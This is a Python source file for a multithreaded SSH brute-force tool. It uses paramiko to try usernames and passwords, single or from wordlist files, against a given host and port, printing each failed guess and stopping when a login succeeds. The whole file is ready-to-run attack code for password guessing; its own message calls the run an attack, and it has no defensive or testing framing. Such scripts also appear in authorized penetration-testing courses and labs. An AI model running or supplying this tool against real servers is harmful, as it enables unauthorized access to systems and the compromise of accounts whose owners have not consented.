import argparse
import paramiko
import threading
import termcolor
import time
import os

stop_flag = 0


def ssh_connect(username, password, host, port):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, username=username, password=password, port=port)
        print(termcolor.colored(
            f"[+] FOUND => {username}:{password}", "green"))
        stop_flag = 1
    except paramiko.AuthenticationException:
        print(termcolor.colored(
            f"[-] WRONG CREDENTIAL => {username}:{password}", "red"))
        ssh.close()


def check_exits(filepath):
    if os.path.exists(filepath) == False:
        print(f"{filepath} is not exist")
        return False
    return True


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="IP address of host")
    parser.add_argument("port", help="Port of host")
    parser.add_argument("-u", "--username", help="Username")
    parser.add_argument("-p", "--password", help="Password")
    parser.add_argument("-uf", "--userfile",
                        help="Username filepath")
    parser.add_argument("-pf", "--passfile",
                        help="Password filepath")
    args = parser.parse_args()
    host = args.host
    port = args.port
    username = args.username
    password = args.password
    userfile = args.userfile
    passfile = args.passfile
    if password and userfile:
        if check_exits(userfile) == True:
            with open(userfile, 'r') as file:
                for line in file.readlines():
                    if stop_flag == 1:
                        t.join()
                        exit()
                    u = line.strip()
                    t = threading.Thread(target=ssh_connect,
                                         args=(u, password, host, port))
                    t.start()
                    time.sleep(1)
    elif username and passfile:
        if check_exits(passfile) == True:
            with open(passfile, 'r') as file:
                for line in file.readlines():
                    if stop_flag == 1:
                        t.join()
                        exit()
                    p = line.strip()
                    t = threading.Thread(target=ssh_connect,
                                         args=(username, p, host, port))
                    t.start()
                    time.sleep(1)
    elif userfile and passfile:
        if check_exits(userfile) == True and check_exits(passfile) == True:
            user_wordlists = []
            pass_wordlists = []
            with open(userfile, "r") as file:
                for line in file.readlines():
                    user_wordlists.append(line.strip())
            with open(passfile, "r") as file:
                for line in file.readlines():
                    pass_wordlists.append(line.strip())
            for u in user_wordlists:
                for p in pass_wordlists:
                    if stop_flag == 1:
                        t.join()
                        exit()
                    t = threading.Thread(
                        target=ssh_connect, args=(u, p, host, port))
                    t.start()
                    time.sleep(1)
    else:
        print("You need two paramaters to perform the attack")
    time.sleep(3)
    if stop_flag == 0:
        print(termcolor.colored(
            "[*] CAN NOT FIND THE CREDENTIAL", "yellow"))


if __name__ == "__main__":
    main()